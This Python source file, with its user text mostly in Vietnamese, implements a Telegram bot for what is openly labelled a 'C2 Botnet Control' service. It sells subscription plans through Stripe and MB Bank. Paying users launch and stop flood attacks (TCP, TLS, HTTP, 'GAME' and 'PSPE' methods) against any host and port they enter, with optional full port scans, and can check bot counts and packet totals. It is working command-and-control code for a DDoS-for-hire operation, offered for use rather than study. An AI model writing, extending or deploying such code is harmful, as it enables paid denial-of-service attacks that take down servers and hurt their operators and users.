# Telegram Bot — Full C2 Control
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from app.config import settings
from app.database import async_session
from app.models.all_models import User, UserSubscription, Plan, AttackTask, Bot, TelegramSession, Payment
from app.services.attack_service import AttackService
from app.services.bot_service import BotService
from app.schemas.all_schemas import AttackCreate
from app.mbbank import get_mb
from sqlalchemy import select
from sqlalchemy.orm.attributes import flag_modified
from datetime import datetime, timezone, timedelta
import uuid, asyncio

HELP_TEXT = (
    "🎯 *C2 Botnet Control*\n\n"
    "📋 */plans* — Gói cước\n"
    "💰 */buy* — Mua gói\n"
    "⚔️ */attack* — Launch attack\n"
    "🛑 */stop* — Dừng attack\n"
    "📊 */status* — Attack đang chạy\n"
    "🤖 */bots* — Bot online\n"
    "💵 */balance* — Số dư / plan\n"
    "❓ */help* — Menu này"
)

async def init_telegram():
    if not settings.TELEGRAM_BOT_TOKEN:
        return
    app = Application.builder().token(settings.TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("plans", cmd_plans))
    app.add_handler(CommandHandler("buy", cmd_buy))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("balance", cmd_balance))
    app.add_handler(CommandHandler("bots", cmd_bots))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    print("[Telegram] Bot started")

async def get_user(tid: int):
    async with async_session() as s:
        r = await s.execute(select(User).where(User.telegram_id == tid))
        return r.scalar_one_or_none()

async def get_user_plan(user: User):
    async with async_session() as s:
        r = await s.execute(select(UserSubscription).where(
            UserSubscription.user_id == user.id, UserSubscription.status == "active"
        ))
        sub = r.scalar_one_or_none()
        if sub:
            r2 = await s.execute(select(Plan).where(Plan.id == sub.plan_id))
            return sub, r2.scalar_one_or_none()
        return None, None

async def ensure_session(user: User, chat_id: int):
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()
        if not ts:
            ts = TelegramSession(user_id=user.id, chat_id=chat_id, state="idle", data={})
            s.add(ts)
            await s.commit()
            await s.refresh(ts)
        return ts

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tid = update.effective_user.id
    tname = update.effective_user.username or f"user_{tid}"

    # Check for deep link param: /start TOKEN
    if context.args and len(context.args) > 0:
        token = context.args[0]
        # Verify token with C2 server
        try:
            import aiohttp
            from app.config import settings
            # Prefer in-process call (same memory as API) — avoids HTTP/localhost issues
            from app.routers.auth_router import _pending_tokens
            entry = _pending_tokens.get(token)
            if entry and entry.get("expires") and entry["expires"] > datetime.now(timezone.utc):
                entry["state"] = "verified"
                entry["telegram_id"] = tid
                entry["telegram_username"] = tname
                print(f"[telegram] verify-bot OK in-process tid={tid}")
                await update.message.reply_text(
                    "✅ *Xác thực thành công!*\n\n"
                    "Quay lại website — trang sẽ đăng nhập tự động.\n\n"
                    f"{HELP_TEXT}",
                    parse_mode="Markdown",
                )
            elif entry is None:
                # Fallback HTTP if token not in this process (multi-worker)
                api_url = f"http://127.0.0.1:{settings.C2_PORT}/api/auth/telegram/verify-bot"
                async with aiohttp.ClientSession() as session:
                    async with session.post(api_url, json={
                        "token": token,
                        "telegram_id": tid,
                        "telegram_username": tname,
                    }) as r:
                        resp_text = await r.text()
                        print(f"[telegram] verify-bot HTTP status={r.status} resp={resp_text}")
                        if r.status == 200:
                            await update.message.reply_text(
                                "✅ *Xác thực thành công!*\n\n"
                                "Quay lại website — đăng nhập tự động.\n\n"
                                f"{HELP_TEXT}",
                                parse_mode="Markdown",
                            )
                        else:
                            await update.message.reply_text(
                                "❌ Token không hợp lệ hoặc đã hết hạn.\n"
                                "Bấm *User Login* trên website rồi thử lại.",
                                parse_mode="Markdown",
                            )
            else:
                await update.message.reply_text(
                    "❌ Token đã hết hạn.\nBấm *User Login* trên website rồi thử lại.",
                    parse_mode="Markdown",
                )
        except Exception as e:
            print(f"[telegram] verify error: {e}")
            await update.message.reply_text(f"❌ Lỗi xác thực: {e}")
        return

    # Normal /start (no param) — show welcome
    async with async_session() as s:
        user = await get_user(tid)
        if not user:
            user = User(
                username=f"tg_{tid}",
                telegram_id=tid,
                password_hash="telegram_only",
                role="user",
            )
            s.add(user)
            await s.commit()
            await s.refresh(user)
            s.add(TelegramSession(user_id=user.id, chat_id=update.effective_chat.id, state="idle", data={}))
            await s.commit()
            await update.message.reply_text(
                f"🎯 *Chào mừng!*\n\nTài khoản đã liên kết: `{user.username}`\n\n{HELP_TEXT}",
                parse_mode="Markdown",
            )
        else:
            sub, plan = await get_user_plan(user)
            plan_line = f"Plan: *{plan.name}*" if plan else "Plan: _chưa mua_ — /buy"
            await update.message.reply_text(
                f"👋 *{user.username}*\n{plan_line}\n\n{HELP_TEXT}",
                parse_mode="Markdown",
            )

async def cmd_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True))
        plans = r.scalars().all()
    if not plans:
        await update.message.reply_text("Chưa có gói nào.")
        return
    kb = []
    text = "📋 *Gói cước:*\n\n"
    for p in plans:
        kb.append([InlineKeyboardButton(
            f"{p.name} — {p.price_vnd:,}đ (${p.price_usd})",
            callback_data=f"buy_{p.slug}",
        )])
        methods = ", ".join(p.allowed_methods or [])
        text += (
            f"*{p.name}* (`{p.slug}`)\n"
            f"├ Bot: {p.max_bots} · Concurrent: {p.max_concurrent}\n"
            f"├ Duration: {p.max_attack_secs}s · Cooldown: {p.cooldown_secs}s\n"
            f"├ PPS: {p.max_pps_per_bot:,}/bot\n"
            f"├ Methods: {methods}\n"
            f"└ {p.price_vnd:,}đ/th (${p.price_usd})\n\n"
        )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def cmd_buy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    async with async_session() as s:
        r = await s.execute(select(Plan).where(Plan.is_active == True))
        plans = r.scalars().all()
    if not plans:
        await update.message.reply_text("Chưa có gói.")
        return
    kb = [[InlineKeyboardButton(f"{p.name} — {p.price_vnd:,}đ", callback_data=f"buy_{p.slug}")] for p in plans]
    await update.message.reply_text("💰 *Chọn gói:*", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))

async def cmd_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    sub, plan = await get_user_plan(user)
    if not sub or not plan:
        await update.message.reply_text("❌ Chưa có plan active.\nDùng /buy để mua.")
        return
    await ensure_session(user, update.effective_chat.id)
    methods = plan.allowed_methods or ["PSPE", "TCP", "TLS", "HTTP", "GAME"]
    valid = {"PSPE", "TCP", "TLS", "HTTP", "GAME"}
    methods = [m for m in methods if m in valid]
    if not methods:
        await update.message.reply_text("❌ Plan không có method nào khả dụng.")
        return
    kb = [[InlineKeyboardButton(m, callback_data=f"atk_method_{m}")] for m in methods]
    kb.append([InlineKeyboardButton("❌ Cancel", callback_data="atk_cancel")])
    await update.message.reply_text(
        f"⚔️ *Launch Attack*\nPlan: *{plan.name}* · max {plan.max_attack_secs}s\n\nChọn method:",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb),
    )

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(
            AttackTask.user_id == user.id, AttackTask.status == "running"
        ))
        tasks = list(r.scalars().all())
    if not tasks:
        await update.message.reply_text("Không có attack nào đang chạy.")
        return
    for t in tasks:
        try:
            await AttackService.stop(t.id, user)
        except Exception:
            pass
    await update.message.reply_text(f"🛑 Đã gửi stop cho *{len(tasks)}* attack.", parse_mode="Markdown")

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    async with async_session() as s:
        r = await s.execute(select(AttackTask).where(
            AttackTask.user_id == user.id, AttackTask.status == "running"
        ))
        tasks = list(r.scalars().all())
    if not tasks:
        await update.message.reply_text("📊 Không có attack active.")
        return
    text = "📊 *Active Attacks:*\n\n"
    for t in tasks:
        elapsed = 0
        if t.started_at:
            started = t.started_at if t.started_at.tzinfo else t.started_at.replace(tzinfo=timezone.utc)
            elapsed = (datetime.now(timezone.utc) - started).total_seconds()
        text += (
            f"🎯 `{t.target_host}:{t.target_port}`\n"
            f"├ Method: *{t.method}* · {int(elapsed)}s / {t.duration_secs}s\n"
            f"├ Packets: `{t.total_packets or 0:,}`\n"
            f"└ Bots: {len(t.bot_ids or [])}\n\n"
        )
    await update.message.reply_text(text, parse_mode="Markdown")

async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        await update.message.reply_text("Gõ /start trước.")
        return
    sub, plan = await get_user_plan(user)
    exp = sub.expires_at.strftime("%d/%m/%Y") if sub and sub.expires_at else "N/A"
    await update.message.reply_text(
        f"💵 *Balance*\n\n"
        f"├ Credit: `${float(user.credit_balance or 0):.2f}`\n"
        f"├ Plan: *{plan.name if plan else 'None'}*\n"
        f"└ Expires: `{exp}`",
        parse_mode="Markdown",
    )

async def cmd_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = await BotService.count_online()
    await update.message.reply_text(f"🤖 *{count}* bot online.", parse_mode="Markdown")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(HELP_TEXT, parse_mode="Markdown")

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data or ""
    await query.answer()
    user = await get_user(query.from_user.id)
    if not user:
        await query.edit_message_text("Session hết hạn. Gõ /start")
        return

    if data.startswith("buy_"):
        slug = data[4:]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug))
            plan = r.scalar_one_or_none()
        if not plan:
            await query.edit_message_text("Plan not found.")
            return
        kb = [
            [InlineKeyboardButton(f"💳 Stripe — ${plan.price_usd}", callback_data=f"pay_{plan.slug}_stripe")],
            [InlineKeyboardButton(f"🏦 MB Bank — {plan.price_vnd:,}đ", callback_data=f"pay_{plan.slug}_mbank")],
            [InlineKeyboardButton("❌ Cancel", callback_data="pay_cancel")],
        ]
        await query.edit_message_text(
            f"🛒 *{plan.name}*\n{plan.price_vnd:,}đ / ${plan.price_usd}\n\nChọn phương thức:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(kb),
        )

    elif data.startswith("pay_") and data.endswith("_stripe"):
        slug = data[4:-7]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug))
            plan = r.scalar_one_or_none()
        if not plan:
            await query.edit_message_text("Plan not found.")
            return
        if not settings.STRIPE_SECRET_KEY:
            await query.edit_message_text("Stripe chưa cấu hình.")
            return
        import stripe
        stripe.api_key = settings.STRIPE_SECRET_KEY
        try:
            session = stripe.checkout.Session.create(
                payment_method_types=["card"],
                line_items=[{
                    "price_data": {
                        "currency": "usd",
                        "product_data": {"name": f"C2 {plan.name}"},
                        "unit_amount": int(float(plan.price_usd) * 100),
                    },
                    "quantity": 1,
                }],
                mode="payment",
                success_url=f"{settings.DASHBOARD_URL}/payment/success",
                cancel_url=f"{settings.DASHBOARD_URL}/payment/cancel",
                metadata={"user_id": str(user.id), "plan_id": str(plan.id)},
            )
            async with async_session() as s:
                s.add(Payment(
                    user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd,
                    method="stripe", tx_ref=session.id, payment_url=session.url,
                ))
                await s.commit()
            await query.edit_message_text(f"💳 [Thanh toán Stripe]({session.url})", parse_mode="Markdown")
        except Exception as e:
            await query.edit_message_text(f"Stripe error: {e}")

    elif data.startswith("pay_") and data.endswith("_mbank"):
        slug = data[4:-6]
        async with async_session() as s:
            r = await s.execute(select(Plan).where(Plan.slug == slug))
            plan = r.scalar_one_or_none()
        if not plan:
            await query.edit_message_text("Plan not found.")
            return
        tx_ref = f"C2{uuid.uuid4().hex[:8].upper()}"
        async with async_session() as s:
            s.add(Payment(
                user_id=user.id, amount_vnd=plan.price_vnd, amount_usd=plan.price_usd,
                method="mbank", tx_ref=tx_ref,
                meta={"plan_id": str(plan.id), "plan_slug": plan.slug},
            ))
            await s.commit()
        from app.mbbank import payment_qr_payload
        from app.config import settings as _st
        body = payment_qr_payload(
            amount=int(plan.price_vnd),
            tx_ref=tx_ref,
            account_no=_st.MB_ACCOUNT_NUMBER,
            account_name=_st.MB_ACCOUNT_NAME or "",
        )
        qr = body.get("qr_url") or ""
        text = (
            f"🏦 *Thanh toán MB Bank (VietQR)*\n\n"
            f"📦 Plan: *{plan.name}*\n"
            f"💰 Số tiền: *{plan.price_vnd:,}đ*\n"
            f"🏧 Ngân hàng: *MB Bank*\n"
            f"📋 STK: `{body.get('bank_account')}`\n"
            f"👤 Chủ TK: `{body.get('account_name') or '—'}`\n"
            f"📝 Nội dung CK: `{tx_ref}`\n\n"
            f"⚠️ Quét QR trong app ngân hàng — tự điền STK + tiền + nội dung.\n"
            f"🆔 `{tx_ref}`"
        )
        if qr:
            try:
                await query.message.reply_photo(photo=qr, caption=text, parse_mode="Markdown")
                await query.edit_message_text("✅ Đã gửi VietQR bên dưới.")
            except Exception:
                await query.edit_message_text(text + (f"\n\n[Mở QR]({qr})" if qr else ""), parse_mode="Markdown")
        else:
            await query.edit_message_text(text, parse_mode="Markdown")

    elif data == "pay_cancel":
        await query.edit_message_text("Đã hủy.")

    elif data.startswith("atk_method_"):
        method = data[11:]
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts:
                d = dict(ts.data or {})
                d["method"] = method
                ts.data = d
                ts.state = "setting_target"
                flag_modified(ts, "data")
                await s.commit()
        await query.edit_message_text(
            f"⚔️ Method: *{method}*\n\n"
            f"Nhập target:\n`host:port duration [scan]`\n\n"
            f"VD: `game.example.com:30120 60`\n"
            f"Full scan 1-65535: `game.example.com:30120 60 scan`",
            parse_mode="Markdown",
        )

    elif data == "atk_cancel":
        async with async_session() as s:
            r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
            ts = r.scalar_one_or_none()
            if ts:
                ts.state = "idle"
                ts.data = {}
                flag_modified(ts, "data")
                await s.commit()
        await query.edit_message_text("Đã hủy attack.")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await get_user(update.effective_user.id)
    if not user:
        return
    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts = r.scalar_one_or_none()
    if not ts or ts.state != "setting_target":
        return

    text = (update.message.text or "").strip()
    parts = text.split()
    if len(parts) < 1:
        await update.message.reply_text("❌ Format: `host:port duration`", parse_mode="Markdown")
        return

    host_port = parts[0]
    duration = 60
    if len(parts) >= 2:
        try:
            duration = int(parts[1])
        except ValueError:
            await update.message.reply_text("❌ Duration phải là số giây.")
            return

    host, port = host_port, 80
    if ":" in host_port:
        host, p = host_port.rsplit(":", 1)
        try:
            port = int(p)
        except ValueError:
            await update.message.reply_text("❌ Port không hợp lệ.")
            return

    do_scan = False
    if len(parts) >= 3 and parts[2].lower() in ("scan", "full", "1", "true"):
        do_scan = True

    method = (ts.data or {}).get("method", "PSPE")
    sub, plan = await get_user_plan(user)
    if not sub or not plan:
        await update.message.reply_text("❌ Chưa có plan. /buy")
        return
    if method not in (plan.allowed_methods or []):
        await update.message.reply_text(f"❌ Method *{method}* không có trong plan.", parse_mode="Markdown")
        return

    try:
        if do_scan:
            await update.message.reply_text(f"🔍 Scanning `{host}` (1-65535)...")
        atk = AttackCreate(
            target_host=host,
            target_port=port,
            method=method,
            duration_secs=min(duration, plan.max_attack_secs),
            pps_per_bot=plan.max_pps_per_bot,
            mega_mode=(method == "PSPE"),
            tls_exhaust=(method == "TLS"),
            scan_ports=do_scan,
        )
        task = await AttackService.launch(user, atk)
        await update.message.reply_text(
            f"✅ *Attack launched*\n\n"
            f"🎯 `{host}:{port}`\n"
            f"├ Method: *{method}*\n"
            f"├ Duration: {min(duration, plan.max_attack_secs)}s\n"
            f"├ Scan: *{'full 1-65535' if do_scan else 'port only'}*\n"
            f"└ Bots: {len(task.bot_ids or [])}\n\n"
            f"🛑 /stop · 📊 /status",
            parse_mode="Markdown",
        )
    except Exception as e:
        await update.message.reply_text(f"❌ {e}")

    async with async_session() as s:
        r = await s.execute(select(TelegramSession).where(TelegramSession.user_id == user.id))
        ts2 = r.scalar_one_or_none()
        if ts2:
            ts2.state = "idle"
            ts2.data = {}
            flag_modified(ts2, "data")
            await s.commit()
